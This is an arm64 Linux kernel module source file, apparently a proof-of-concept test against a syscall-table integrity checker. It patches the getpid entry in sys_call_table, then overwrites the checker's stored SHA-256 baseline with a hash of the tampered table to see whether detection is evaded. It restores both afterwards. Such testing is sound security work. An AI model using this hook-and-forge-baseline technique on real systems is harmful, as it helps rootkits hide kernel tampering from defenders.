// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright (C) 2026 dere3046
 */

#define POC_NAME "poc_fake_baseline"
#define POC_DESC "inte poc overwrite syscall baseline"

#include "poc_common.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("dere3046");
MODULE_DESCRIPTION(POC_DESC);
#include <asm/unistd.h>
#include <crypto/hash.h>

static int poc_sha256(const void *data, size_t length, u8 *hash)
{
	struct crypto_shash *tfm;
	SHASH_DESC_ON_STACK(desc, tfm);
	int ret;

	tfm = crypto_alloc_shash("sha256", 0, 0);
	if (IS_ERR(tfm))
		return PTR_ERR(tfm);
	desc->tfm = tfm;
	ret = crypto_shash_digest(desc, data, length, hash);
	crypto_free_shash(tfm);
	return ret;
}

static int __init poc_init(void)
{
	const unsigned int length = __NR_syscalls * sizeof(unsigned long);
	unsigned long *table;
	unsigned char saved[32];
	unsigned char fresh[32];
	unsigned long saved_entry;
	unsigned long symbol;
	int before;
	int after;
	int i;
	int ret;

	ret = poc_init_common();
	if (ret)
		return ret;
	if (!poc_hash_baseline || !poc_check_task || !poc_syscall_table_event_count)
		return -EINVAL;

	table = (unsigned long *)poc_resolve("sys_call_table");
	symbol = poc_resolve("__arm64_sys_getppid");
	if (!table || !symbol)
		return -ENODATA;

	saved_entry = READ_ONCE(table[__NR_getpid]);
	ret = poc_patch_word((void *)&table[__NR_getpid], symbol);
	if (ret) {
		poc_err("table patch failed %d", ret);
		return ret;
	}

	before = READ_ONCE(*(int *)poc_syscall_table_event_count);
	poc_call_check_task((void *)poc_check_task);
	after = READ_ONCE(*(int *)poc_syscall_table_event_count);
	poc_info("patched table event %d -> %d", before, after);

	memcpy(saved, (void *)poc_hash_baseline, sizeof(saved));
	ret = poc_sha256(table, length, fresh);
	if (ret) {
		poc_err("do_hash failed %d", ret);
		poc_patch_word((void *)&table[__NR_getpid], saved_entry);
		return ret;
	}
	for (i = 0; i < 4; i++)
		poc_patch_word((void *)(poc_hash_baseline + i * sizeof(unsigned long)),
			       ((unsigned long *)fresh)[i]);

	before = READ_ONCE(*(int *)poc_syscall_table_event_count);
	poc_call_check_task((void *)poc_check_task);
	after = READ_ONCE(*(int *)poc_syscall_table_event_count);
	poc_info("patched baseline event %d -> %d", before, after);
	poc_info("%s", after == before ? "PASS" : "FAIL");

	for (i = 0; i < 4; i++)
		poc_patch_word((void *)(poc_hash_baseline + i * sizeof(unsigned long)),
			       ((unsigned long *)saved)[i]);
	poc_patch_word((void *)&table[__NR_getpid], saved_entry);
	return 0;
}

static void __exit poc_exit(void)
{
	poc_exit_common();
}

module_init(poc_init);
module_exit(poc_exit);
